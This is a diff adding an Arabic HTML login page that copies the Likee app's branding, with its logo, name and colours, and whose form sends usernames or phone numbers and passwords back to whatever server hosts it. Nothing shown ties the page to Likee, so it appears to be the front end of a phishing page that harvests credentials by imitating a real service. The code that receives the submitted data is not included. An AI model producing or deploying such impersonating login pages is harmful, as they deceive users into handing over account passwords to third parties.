@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<title>تسجيل الدخول إلى لايكي</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+
+  body {
+    margin: 0;
+    background-color: #ffffff; /* خلفية بيضاء */
+    font-family: 'Roboto', sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    color: #000000;
+  }
+
+  .container {
+    background-color: #ffffff; /* خلفية بيضاء للصندوق */
+    padding: 40px 35px;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    width: 360px;
+    text-align: center;
+    box-sizing: border-box;
+  }
+
+  .logo {
+    margin-bottom: 25px;
+  }
+
+  .logo img {
+    width: 80px;
+    height: auto;
+    display: block;
+    margin: 0 auto;
+  }
+
+  h2 {
+    margin-bottom: 25px;
+    font-weight: 700;
+    font-size: 22px;
+    color: #ff2e93;
+  }
+
+  input[type="text"], input[type="password"] {
+    width: 100%;
+    padding: 12px 14px;
+    margin-bottom: 20px;
+    border: 1px solid #ccc;
+    border-radius: 6px;
+    font-size: 15px;
+    box-sizing: border-box;
+    direction: ltr;
+  }
+
+  button {
+    width: 100%;
+    background: linear-gradient(90deg, #ff2e93, #ff981f);
+    color: white;
+    border: none;
+    padding: 14px 0;
+    border-radius: 6px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+  }
+
+  button:hover {
+    opacity: 0.9;
+  }
+
+  ::placeholder {
+    color: #999999;
+    text-align: right;
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/1/1e/Likee_logo.svg" alt="Likee Logo" />
+    </div>
+    <h2>تسجيل الدخول إلى لايكي</h2>
+    <form method="POST">
+      <input type="text" name="username" placeholder="اسم المستخدم أو رقم الهاتف" required />
+      <input type="password" name="password" placeholder="كلمة المرور" required />
+      <button type="submit">تسجيل الدخول</button>
+    </form>
+  </div>
+</body>
+</html>
